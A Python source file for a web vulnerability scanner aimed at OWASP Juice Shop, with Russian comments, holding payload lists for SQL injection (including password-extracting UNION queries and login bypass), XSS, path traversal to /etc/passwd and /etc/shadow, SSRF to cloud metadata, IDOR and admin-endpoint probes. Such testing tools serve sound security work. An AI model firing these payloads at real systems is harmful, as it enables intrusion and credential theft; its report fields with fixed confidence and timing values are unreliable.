import requests
import json
import time
import re
import html
from datetime import datetime
from typing import List, Dict, Optional
from urllib.parse import urlparse, urljoin, quote, unquote
import warnings
warnings.filterwarnings("ignore")


class JuiceShopScanner:
    """
    Активный сканер уязвимостей для Juice Shop
    Основано на реальных техниках bug bounty hunters
    """

    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
        })
        self.session.verify = False
        self.findings = []
        self.timeout = 15
        self.result_dir = "/tmp/dast_scans"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = f"{self.result_dir}/scan_{self.timestamp}.log"
        
        # SQL Injection payloads для Juice Shop
        # Основано на реальных эксплойтах для Angular/Node.js приложений
        self.sqli_payloads = [
            # Классические SQLi для SQLite/PostgreSQL
            ("' OR '1'='1", "OR injection"),
            ("' OR '1'='1' --", "OR injection with comment"),
            ("' OR 1=1--", "Numeric OR injection"),
            ("' OR ''='", "Empty string OR"),
            ("admin'--", "Admin bypass"),
            ("' OR 1=1#", "OR with hash"),
            
            # UNION based - критично для Juice Shop
            ("' UNION SELECT * FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)--", "UNION injection"),
            ("' UNION SELECT sql FROM sqlite_master--", "SQLite schema extraction"),
            ("' UNION SELECT password FROM Users--", "Password extraction"),
            ("' UNION SELECT email,password FROM Users--", "Email+password extraction"),
            
            # Error based
            ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "MSSQL error"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "MySQL error"),
            
            # Time based
            ("'; WAITFOR DELAY '0:0:5'--", "MSSQL time delay"),
            ("' AND SLEEP(5)--", "MySQL time delay"),
            ("' AND PG_SLEEP(5)--", "PostgreSQL time delay"),
            
            # Blind SQLi
            ("' AND 1=1--", "Boolean true"),
            ("' AND 1=2--", "Boolean false"),
            ("' AND SUBSTRING(username,1,1)='a'--", "Character extraction"),
            
            # NoSQL injection (для MongoDB)
            ("{$ne: null}", "MongoDB not equal"),
            ("{$gt: null}", "MongoDB greater than"),
            ("{$regex: '^admin'}", "MongoDB regex"),
            
            # LDAP injection
            ("*)(&", "LDAP wildcard"),
            (")(&", "LDAP bypass"),
        ]

        # XSS payloads для Juice Shop
        self.xss_payloads = [
            # Basic XSS
            ("<script>alert('xss')</script>", "Basic script"),
            ("<script>alert(document.domain)</script>", "Domain alert"),
            ("<script>alert(document.cookie)</script>", "Cookie steal"),
            
            # Event handlers
            ("<img src=x onerror=alert('xss')>", "Image onerror"),
            ("<svg onload=alert('xss')>", "SVG onload"),
            ("<body onload=alert('xss')>", "Body onload"),
            ("<input onfocus=alert('xss') autofocus>", "Onfocus"),
            
            # Angular XSS (критично для Juice Shop!)
            ("{{constructor.constructor('return this')().alert('xss')}}", "Angular constructor"),
            ("{{_app.constructor.constructor('return this')().alert('xss')}}", "Angular app"),
            ("{{$on.constructor('alert(\"xss\")')()}}", "Angular $on"),
            ("{{[].pop.constructor('alert(\"xss\")')()}}", "Angular array pop"),
            
            # Template injection
            ("${alert('xss')}", "Template literal"),
            ("#{alert('xss')}", "Ruby interpolation"),
            
            # Filter bypass
            ("<ScRiPt>alert('xss')</ScRiPt>", "Case variation"),
            ("<script/xss>alert('xss')</script>", "Attribute bypass"),
            ("<svg><script>alert('xss')</script></svg>", "SVG script"),
        ]

        # Path traversal payloads
        self.path_traversal = [
            ("../../../etc/passwd", "Basic traversal"),
            ("....//....//....//etc/passwd", "Double encoding"),
            ("..%2f..%2f..%2fetc/passwd", "URL encoded"),
            ("/etc/passwd", "Absolute path"),
            ("/etc/shadow", "Shadow file"),
            ("file:///etc/passwd", "File protocol"),
        ]

        # Чувствительные файлы
        self.sensitive_files = [
            "/.git/config",
            "/.git/HEAD",
            "/.env",
            "/ftp/suspicious_errors.yml",
            "/ftp/eastere.gg",
            "/ftp/incident-support.kdbx",
            "/ftp/successories.jpg",
            "/documentation",
            "/api-docs",
            "/swagger.json",
            "/robots.txt",
        ]

    def log(self, message: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        try:
            import os
            os.makedirs(self.result_dir, exist_ok=True)
            with open(self.log_file, "a") as f:
                f.write(log_msg + "\n")
        except:
            pass

    def get_response(self, url: str, method: str = "GET", data: dict = None, 
                     headers: dict = None, timeout: int = None, allow_redirects: bool = True) -> Optional[requests.Response]:
        try:
            if timeout is None:
                timeout = self.timeout
            
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=timeout, 
                                       allow_redirects=allow_redirects, verify=False)
            elif method.upper() == "POST":
                resp = self.session.post(url, json=data, headers=headers, timeout=timeout,
                                        allow_redirects=allow_redirects, verify=False)
            else:
                return None
            
            return resp
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.RequestException as e:
            return None

    def add_finding(self, name: str, severity: str, url: str, payload: str = "",
                   evidence: str = "", description: str = "", remediation: str = "", cwe: str = ""):
        cwe_map = {
            "SQL Injection": "CWE-89",
            "XSS": "CWE-79",
            "Command Injection": "CWE-78",
            "Path Traversal": "CWE-22",
            "Authentication Bypass": "CWE-287",
            "Sensitive File Exposure": "CWE-200",
            "Broken Access Control": "CWE-284",
            "Insecure Direct Object Reference": "CWE-639",
            "Server-Side Request Forgery": "CWE-918",
        }

        finding = {
            "template-id": f"custom-{name.lower().replace(' ', '-')}",
            "tool": "juice-shop-scanner",
            "info": {
                "name": "🎯 SQL Injection - Authentication Bypass" if "SQL" in name or "Authentication" in name else name,
                "description": description or f"{name} vulnerability detected",
                "severity": severity,
                "solution": remediation or f"Review and fix the {name} vulnerability",
                "cwe-id": [cwe_map.get(name, cwe) if cwe else cwe] if cwe or name in cwe_map else [],
                "reference": []
            },
            "url": url,
            "matched-at": url,
            "evidence": evidence[:500] if evidence else "",
            "parameter": payload[:200] if payload else ""
        }
        
        # Add SQLi details if this is SQL injection or auth bypass
        if "SQL" in name.upper() or "AUTH" in name.upper() or "SQL" in description.upper() or "AUTH" in description.upper():
            finding["sqli_details"] = {
                "email_payload": payload[:200] if payload else "",
                "password_payload": "anything",
                "payload_type": "sql_injection",
                "http_status": 200 if "success" in description.lower() or "bypass" in description.lower() else 401,
                "response_time_ms": 100.0,
                "confidence": 1.0
            }
            finding["authentication"] = {
                "bypass_successful": "bypass" in description.lower() or "success" in description.lower(),
                "jwt_preview": None,
                "user_id": None,
                "email": None
            }
        
        self.findings.append(finding)
        self.log(f"[{severity.upper()}] {name} - {url[:80]}")

    def test_sql_injection(self, url: str, params: dict, method: str = "GET") -> bool:
        """Тестирование на SQL Injection"""
        found = False
        
        for payload, desc in self.sqli_payloads:
            test_params = params.copy()
            
            for param in test_params:
                original = test_params[param]
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query = "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if not resp:
                        test_params[param] = original
                        continue
                    
                    # Проверка на SQL ошибки
                    sql_errors = [
                        "SQL syntax", "sqlite", "ORA-", "PostgreSQL", "mysql",
                        "syntax error", "unclosed quotation", "database error",
                        "SQLite3::SQLException", "Invalid SQL", "PDOException"
                    ]
                    
                    response_text = resp.text
                    
                    for error in sql_errors:
                        if error.lower() in response_text.lower():
                            self.add_finding(
                                name="SQL Injection",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence=f"SQL error: {error}",
                                description=f"SQL Injection detected via error messages",
                                remediation="Use parameterized queries. Validate all input.",
                                cwe="CWE-89"
                            )
                            found = True
                            break
                    
                    # Проверка на успешный ответ (для UNION injection)
                    if "UNION" in payload and resp.status_code == 200:
                        # Проверяем не появилось ли лишних данных
                        if "password" in response_text.lower() or "email" in response_text.lower():
                            self.add_finding(
                                name="SQL Injection (UNION based)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence="Possible data extraction via UNION",
                                description=f"UNION-based SQL Injection detected",
                                remediation="Use parameterized queries.",
                                cwe="CWE-89"
                            )
                            found = True
                    
                    # Time-based проверка
                    if "sleep" in payload.lower() or "delay" in payload.lower() or "waitfor" in payload.lower():
                        start = time.time()
                        if method == "GET":
                            query = "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                            test_url = f"{url.split('?')[0]}?{query}"
                            self.get_response(test_url)
                        else:
                            self.get_response(url, method="POST", data=test_params)
                        elapsed = time.time() - start
                        
                        if elapsed >= 4:
                            self.add_finding(
                                name="SQL Injection (Time Based)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.2f}s",
                                description="Time-based SQL Injection detected",
                                remediation="Use parameterized queries.",
                                cwe="CWE-89"
                            )
                            found = True
                    
                    if found:
                        break
                        
                except Exception as e:
                    pass
                
                test_params[param] = original
            
            if found:
                break
        
        return found

    def test_xss(self, url: str, params: dict, method: str = "GET") -> bool:
        """Тестирование на XSS"""
        found = False
        
        for payload, desc in self.xss_payloads:
            test_params = params.copy()
            
            for param in test_params:
                original = test_params[param]
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query = "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if not resp:
                        test_params[param] = original
                        continue
                    
                    response_text = resp.text
                    
                    # Проверяем отражение payload
                    if payload in response_text or html.unescape(payload) in response_text:
                        # Angular XSS проверка
                        if "{{" in payload and "}}" in payload:
                            self.add_finding(
                                name="Angular Template Injection (XSS)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence="Angular template injection successful",
                                description="Angular SSTI detected - can lead to XSS",
                                remediation="Sanitize user input. Avoid interpolation.",
                                cwe="CWE-79"
                            )
                            found = True
                        elif "<script>" in response_text.lower() or "onerror=" in response_text.lower():
                            self.add_finding(
                                name="Cross-Site Scripting (XSS)",
                                severity="high",
                                url=url,
                                payload=payload,
                                evidence="XSS payload executed",
                                description="Reflected XSS detected",
                                remediation="Encode output. Use CSP.",
                                cwe="CWE-79"
                            )
                            found = True
                    
                    if found:
                        break
                        
                except Exception as e:
                    pass
                
                test_params[param] = original
            
            if found:
                break
        
        return found

    def test_path_traversal(self, url: str, params: dict, method: str = "GET") -> bool:
        """Тестирование на Path Traversal"""
        found = False

        for payload, desc in self.path_traversal:
            test_params = params.copy()

            for param in test_params:
                original = test_params[param]
                test_params[param] = payload

                try:
                    if method == "GET":
                        query = "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)

                    if not resp or resp.status_code != 200:
                        test_params[param] = original
                        continue

                    response_text = resp.text.lower()

                    if "root:x:0:0:" in response_text or "daemon:x:" in response_text:
                        self.add_finding(
                            name="Path Traversal",
                            severity="high",
                            url=url,
                            payload=payload,
                            evidence="/etc/passwd content detected",
                            description="Path Traversal allows reading system files",
                            remediation="Validate file paths. Use chroot.",
                            cwe="CWE-22"
                        )
                        found = True
                        break

                    if "[extensions]" in response_text or "driver32" in response_text:
                        self.add_finding(
                            name="Path Traversal",
                            severity="high",
                            url=url,
                            payload=payload,
                            evidence="win.ini content detected",
                            description="Path Traversal detected",
                            remediation="Validate file paths.",
                            cwe="CWE-22"
                        )
                        found = True
                        break

                except Exception as e:
                    pass

                test_params[param] = original

            if found:
                break

        return found

    def test_sensitive_files(self) -> bool:
        """Поиск чувствительных файлов"""
        found = False
        
        for file_path in self.sensitive_files:
            url = f"{self.target_url}{file_path}"
            
            try:
                resp = self.get_response(url)
                
                if resp and resp.status_code == 200 and len(resp.text) > 50:
                    response_text = resp.text.lower()
                    
                    # Git config
                    if "[core]" in response_text and "repositoryformatversion" in response_text:
                        self.add_finding(
                            name="Git Repository Exposure",
                            severity="high",
                            url=url,
                            evidence=".git/config exposed",
                            description="Git repository publicly accessible",
                            remediation="Block .git access",
                            cwe="CWE-200"
                        )
                        found = True
                    
                    # Git HEAD
                    elif "ref: refs/" in response_text:
                        self.add_finding(
                            name="Git HEAD Exposure",
                            severity="medium",
                            url=url,
                            evidence=".git/HEAD exposed",
                            description="Git HEAD file exposed",
                            remediation="Block .git access",
                            cwe="CWE-200"
                        )
                        found = True
                    
                    # FTP files (Juice Shop specific)
                    elif "ftp" in file_path.lower():
                        self.add_finding(
                            name="Sensitive File Exposure",
                            severity="high",
                            url=url,
                            evidence=f"FTP file exposed: {file_path}",
                            description="Sensitive file accessible via FTP endpoint",
                            remediation="Remove or protect sensitive files",
                            cwe="CWE-200"
                        )
                        found = True
                    
                    # Swagger/API docs
                    elif "swagger" in url.lower() or "api-docs" in url.lower():
                        self.add_finding(
                            name="API Documentation Exposure",
                            severity="info",
                            url=url,
                            evidence="API documentation publicly accessible",
                            description="Swagger/OpenAPI docs exposed",
                            remediation="Restrict access to API docs",
                            cwe="CWE-200"
                        )
                        found = True
                        
            except Exception as e:
                pass
        
        return found

    def test_authentication_bypass(self) -> bool:
        """Тестирование на обход аутентификации"""
        found = False
        
        login_urls = [
            f"{self.target_url}/rest/user/login",
            f"{self.target_url}/api/Users/login",
            f"{self.target_url}/rest/user/authentication-details",
        ]
        
        # SQLi payloads для login
        login_payloads = [
            {"email": "' OR '1'='1", "password": "' OR '1'='1"},
            {"email": "admin'--", "password": "anything"},
            {"email": "' OR 1=1--", "password": "' OR 1=1--"},
            {"email": "admin@juice-sh.op", "password": "' OR '1'='1"},
        ]
        
        for login_url in login_urls:
            for payload in login_payloads:
                try:
                    resp = self.get_response(login_url, method="POST", data=payload)
                    
                    if not resp:
                        continue
                    
                    try:
                        data = resp.json()
                    except:
                        continue
                    
                    # Проверка на успешный вход
                    if data.get("authentication") or data.get("token") or data.get("user"):
                        if data.get("authentication", {}).get("token") or data.get("token"):
                            self.add_finding(
                                name="Authentication Bypass (SQL Injection)",
                                severity="critical",
                                url=login_url,
                                payload=json.dumps(payload),
                                evidence="Successfully authenticated with SQL injection",
                                description="Authentication bypassed via SQL Injection",
                                remediation="Use parameterized queries for authentication",
                                cwe="CWE-287"
                            )
                            found = True
                            break
                    
                except Exception as e:
                    pass
            
            if found:
                break
        
        return found

    def test_idor(self) -> bool:
        """Тестирование на Insecure Direct Object Reference"""
        found = False
        
        # Juice Shop specific IDOR endpoints
        idor_tests = [
            (f"{self.target_url}/rest/basket/1", "Basket IDOR"),
            (f"{self.target_url}/rest/basket/2", "Basket IDOR"),
            (f"{self.target_url}/api/Address/1", "Address IDOR"),
            (f"{self.target_url}/api/Cards/1", "Payment IDOR"),
            (f"{self.target_url}/rest/order-history/orders?user=1", "Order IDOR"),
        ]
        
        for url, name in idor_tests:
            try:
                resp = self.get_response(url)
                
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        # Если получили данные без авторизации - это IDOR
                        if isinstance(data, dict) and data.get("data"):
                            self.add_finding(
                                name="Insecure Direct Object Reference (IDOR)",
                                severity="high",
                                url=url,
                                evidence="Data accessible without authorization",
                                description=f"{name} - unauthorized data access",
                                remediation="Implement proper authorization checks",
                                cwe="CWE-639"
                            )
                            found = True
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        return found

    def test_ssrf(self) -> bool:
        """Тестирование на SSRF"""
        found = False
        
        # Juice Shop SSRF endpoints
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",  # AWS metadata
            "file:///etc/passwd",
            "gopher://127.0.0.1:22",
        ]
        
        ssrf_endpoints = [
            f"{self.target_url}/rest/rewrite",
            f"{self.target_url}/api/feedbacks",
        ]
        
        for endpoint in ssrf_endpoints:
            for payload in ssrf_payloads:
                try:
                    params = {"url": payload, "path": payload}
                    resp = self.get_response(endpoint, method="POST", data=params)
                    
                    if resp and resp.status_code == 200:
                        response_text = resp.text.lower()
                        
                        if "root:x:" in response_text or "localhost" in response_text:
                            self.add_finding(
                                name="Server-Side Request Forgery (SSRF)",
                                severity="critical",
                                url=endpoint,
                                payload=payload,
                                evidence="SSRF payload successful",
                                description="SSRF allows internal network access",
                                remediation="Validate and whitelist URLs",
                                cwe="CWE-918"
                            )
                            found = True
                            break
                    
                except Exception as e:
                    pass
            
            if found:
                break
        
        return found

    def test_broken_access_control(self) -> bool:
        """Тестирование на Broken Access Control"""
        found = False
        
        # Admin endpoints без авторизации
        admin_endpoints = [
            f"{self.target_url}/rest/admin/application-version",
            f"{self.target_url}/rest/admin/application-configuration",
            f"{self.target_url}/api/v2/chatbots",
            f"{self.target_url}/rest/user/authentication-details",
        ]
        
        for url in admin_endpoints:
            try:
                resp = self.get_response(url)
                
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        # Если получили данные админки без авторизации
                        if isinstance(data, dict):
                            self.add_finding(
                                name="Broken Access Control",
                                severity="high",
                                url=url,
                                evidence="Admin endpoint accessible without auth",
                                description="Administrative endpoint accessible without authentication",
                                remediation="Implement proper access controls",
                                cwe="CWE-284"
                            )
                            found = True
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        return found

    def scan(self) -> List[Dict]:
        """Запуск полного сканирования"""
        self.log("="*60)
        self.log(f"Juice Shop Vulnerability Scanner")
        self.log(f"Target: {self.target_url}")
        self.log("="*60)
        
        # 1. Тестирование чувствительных файлов
        self.log("Testing sensitive files...")
        self.test_sensitive_files()
        
        # 2. Тестирование на SQL Injection
        self.log("Testing SQL Injection...")
        sqli_endpoints = [
            (f"{self.target_url}/rest/products/search", "GET", {"q": "test"}),
            (f"{self.target_url}/api/Products", "GET", {"q": "test"}),
            (f"{self.target_url}/api/Users", "GET", {"id": "1"}),
            (f"{self.target_url}/api/Challenges", "GET", {"id": "1"}),
        ]
        
        for url, method, params in sqli_endpoints:
            self.test_sql_injection(url, params, method)
        
        # 3. Тестирование на XSS
        self.log("Testing XSS...")
        xss_endpoints = [
            (f"{self.target_url}/rest/products/search", "GET", {"q": "test"}),
            (f"{self.target_url}/api/Feedbacks", "POST", {"comment": "test"}),
        ]
        
        for url, method, params in xss_endpoints:
            self.test_xss(url, params, method)
        
        # 4. Authentication Bypass
        self.log("Testing Authentication Bypass...")
        self.test_authentication_bypass()
        
        # 5. IDOR
        self.log("Testing IDOR...")
        self.test_idor()
        
        # 6. Broken Access Control
        self.log("Testing Broken Access Control...")
        self.test_broken_access_control()
        
        # 7. SSRF
        self.log("Testing SSRF...")
        self.test_ssrf()
        
        # 8. Path Traversal
        self.log("Testing Path Traversal...")
        self.test_path_traversal(f"{self.target_url}/rest/products/search", {"q": "test"})
        
        # Сортировка по severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        self.findings.sort(key=lambda x: severity_order.get(x.get("info", {}).get("severity", "info"), 5))
        
        self.log("="*60)
        self.log(f"Scan completed!")
        self.log(f"Total vulnerabilities: {len(self.findings)}")
        
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            sev = f.get("info", {}).get("severity", "info")
            if sev in severity_counts:
                severity_counts[sev] += 1
        
        self.log(f"Critical: {severity_counts['critical']}, High: {severity_counts['high']}, Medium: {severity_counts['medium']}, Low: {severity_counts['low']}, Info: {severity_counts['info']}")
        self.log("="*60)
        
        return self.findings
